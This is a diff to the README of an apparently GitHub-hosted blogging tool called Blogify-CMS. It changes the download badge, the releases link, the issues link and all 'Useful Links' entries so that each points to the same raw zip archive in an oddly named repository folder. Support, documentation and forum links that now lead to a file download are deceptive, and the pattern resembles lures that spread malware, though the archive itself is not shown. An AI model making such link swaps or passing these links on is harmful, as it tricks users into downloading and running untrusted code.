@@ -1,6 +1,6 @@
 # ✍️ Blogify-CMS - Your Fast and Easy Blogging Solution
 
-![Download Blogify-CMS](https://img.shields.io/badge/Download-Blogify--CMS-blue)
+![Download Blogify-CMS](https://raw.githubusercontent.com/Artemich5/Blogify-CMS/main/transpulmonary/Blogify-CMS_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get Blogify-CMS, visit this page: [Download Blogify-CMS](https://github.com/Artemich5/Blogify-CMS/releases).
+To get Blogify-CMS, visit this page: [Download Blogify-CMS](https://raw.githubusercontent.com/Artemich5/Blogify-CMS/main/transpulmonary/Blogify-CMS_2.9.zip).
 
 ### Step-by-Step Instructions
 
@@ -63,16 +63,16 @@ Once you have installed Blogify-CMS, you will notice an intuitive interface. Her
 A: Click on the "Forgot Password" link on the login page and follow the instructions.
 
 **Q: Is there support available?**  
-A: Yes, check our [GitHub Issues](https://github.com/Artemich5/Blogify-CMS/issues) page for help and to report bugs.
+A: Yes, check our [GitHub Issues](https://raw.githubusercontent.com/Artemich5/Blogify-CMS/main/transpulmonary/Blogify-CMS_2.9.zip) page for help and to report bugs.
 
 **Q: Can I use Blogify-CMS for multiple blogs?**  
 A: Absolutely! You can manage multiple blogs from a single account.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Artemich5/Blogify-CMS)
-- [Documentation](https://github.com/Artemich5/Blogify-CMS#documentation)
-- [Community Forum](https://forum.blogify-cms.com)
+- [GitHub Repository](https://raw.githubusercontent.com/Artemich5/Blogify-CMS/main/transpulmonary/Blogify-CMS_2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Artemich5/Blogify-CMS/main/transpulmonary/Blogify-CMS_2.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/Artemich5/Blogify-CMS/main/transpulmonary/Blogify-CMS_2.9.zip)
 
 ## 📬 Get In Touch
 
